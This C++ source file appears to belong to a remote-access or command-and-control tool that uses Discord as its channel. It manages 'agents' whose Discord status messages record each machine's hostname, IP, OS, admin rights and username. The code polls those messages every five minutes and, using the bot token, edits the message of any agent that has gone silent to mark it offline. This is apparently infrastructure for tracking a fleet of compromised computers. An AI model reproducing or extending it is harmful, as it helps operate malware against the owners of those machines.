#include "agents/dead_agent_manager.h"
#include "agents/callback_utils.h"
#include <iostream>

void EditDiscordMessage(const std::string& botToken, const std::string& channelId, const std::string& messageId, const std::string& jsonPayload) {
    HINTERNET hSession = WinHttpOpen(L"Discord Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring apiPath = L"/api/v10/channels/" + std::wstring(channelId.begin(), channelId.end()) +
        L"/messages/" + std::wstring(messageId.begin(), messageId.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"PATCH", apiPath.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring headers = L"Authorization: Bot " + std::wstring(botToken.begin(), botToken.end()) +
        L"\r\nContent-Type: application/json";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), WINHTTP_ADDREQ_FLAG_ADD);

    const char* payload = jsonPayload.c_str();
    DWORD payloadLength = static_cast<DWORD>(jsonPayload.length());

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload, payloadLength, payloadLength, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

std::chrono::system_clock::time_point ParseLastCheckIn(const std::string& lastCheckInStr) {
    std::tm tm = {};
    std::istringstream ss(lastCheckInStr);
    ss >> std::get_time(&tm, "%Y-%m-%d %H:%M:%S");
    if (ss.fail()) {
        std::cerr << "[DEBUG] Failed to parse time: '" << lastCheckInStr << "'\n";
        return std::chrono::system_clock::now();
    }
    return std::chrono::system_clock::from_time_t(std::mktime(&tm));
}

void CheckDeadAgents(const std::string& botToken, const std::string& channelId) {
    std::cerr << "[DEBUG] Entering CheckDeadAgents for channel: " << channelId << "\n";

    bool firstIteration = true;
    while (true) {
        if (firstIteration) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            firstIteration = false;
        }
        else {
            std::this_thread::sleep_for(std::chrono::seconds(300));
        }

        std::string currentTimeStr = GetUniversalTime();
        auto now = ParseLastCheckIn(currentTimeStr);
        std::cerr << "[DEBUG] Current UTC time: " << currentTimeStr << "\n";

        auto messages = GetMessagesFromChannel(botToken, channelId);
        std::cerr << "[DEBUG] Retrieved " << messages.size() << " messages\n";

        for (const auto& [msgId, content] : messages) {
            std::cerr << "[DEBUG] Processing message ID: " << msgId << ", Full Content: [\n" << content << "\n]\n";

            size_t lastCheckPos = content.find("Field: Last Check In - ```plaintext\n");
            if (lastCheckPos == std::string::npos) {
                std::cerr << "[DEBUG] Could not find Last Check In field in message ID: " << msgId << "\n";
                continue;
            }

            size_t plaintextEnd = lastCheckPos + 21;
            size_t valueStart = content.find('\n', plaintextEnd) + 1;
            size_t valueEnd = content.find("\n```", valueStart);
            if (valueEnd == std::string::npos) {
                std::cerr << "[DEBUG] Malformed Last Check In field in message ID: " << msgId << "\n";
                continue;
            }

            std::string lastCheckInStr = content.substr(valueStart, valueEnd - valueStart);
            std::cerr << "[DEBUG] Extracted Last Check In: '" << lastCheckInStr << "'\n";
            auto lastCheckInTime = ParseLastCheckIn(lastCheckInStr);
            auto timeDiff = std::chrono::duration_cast<std::chrono::seconds>(now - lastCheckInTime).count();
            std::cerr << "[DEBUG] Msg ID: " << msgId << ", Last Check In: " << lastCheckInStr << ", Time Diff: " << timeDiff << "s\n";

            size_t titlePos = content.find("Title: Agent #");
            bool isAlreadyDead = false;
            if (titlePos != std::string::npos) {
                std::string title = content.substr(titlePos + 14, content.find('\n', titlePos) - (titlePos + 14));
                if (title.find("~~") != std::string::npos) {
                    isAlreadyDead = true;
                }
            }

            if (timeDiff > 300 && !isAlreadyDead) {
                std::cerr << "[DEBUG] Agent inactive > 300 seconds, marking as dead, msgId: " << msgId << "\n";
                auto extractField = [&](const std::string& fieldName) -> std::string {
                    size_t pos = content.find("Field: " + fieldName + " - ```plaintext\n");
                    if (pos == std::string::npos) return "";
                    size_t start = content.find('\n', pos + fieldName.length() + 13) + 1;
                    size_t end = content.find("\n```", start);
                    if (end == std::string::npos) return "";
                    return content.substr(start, end - start);
                    };

                std::string deadHostname = extractField("Hostname");
                std::string deadIp = extractField("IP");
                std::string deadOs = extractField("OS");
                std::string deadAdmin = extractField("Admin");
                std::string deadUsername = extractField("Username");

                int deadAgentId = 0;
                if (titlePos != std::string::npos) {
                    std::string agentStr = content.substr(titlePos + 14, content.find('\n', titlePos) - (titlePos + 14));
                    if (agentStr.find("~~") != std::string::npos) {
                        agentStr = agentStr.substr(2, agentStr.length() - 4);
                    }
                    try {
                        deadAgentId = std::stoi(agentStr);
                    }
                    catch (const std::exception&) {
                        deadAgentId = 0;
                    }
                }

                bool deadIsInitializing = content.find("Field: Initialization Progress") != std::string::npos;
                int deadElapsed = 0;
                std::string deadConnectionTime;
                size_t footerPos = content.find("Footer: Connected at: ");
                if (footerPos != std::string::npos) {
                    size_t start = footerPos + 22;
                    size_t end = content.find('\n', start);
                    if (end == std::string::npos) end = content.length();
                    deadConnectionTime = content.substr(start, end - start);
                }
                else {
                    deadConnectionTime = "Unknown";
                }

                std::string deadPayload = CreateJSONPayload(deadAgentId,
                    deadHostname,
                    deadIp,
                    lastCheckInStr,
                    0xFF0000,
                    false,
                    0,
                    "Offline",
                    deadConnectionTime);
                EditDiscordMessage(botToken, channelId, msgId, deadPayload);
                std::cerr << "[DEBUG] Dead agent message edited, msgId: " << msgId << "\n";
            }
        }
    }
}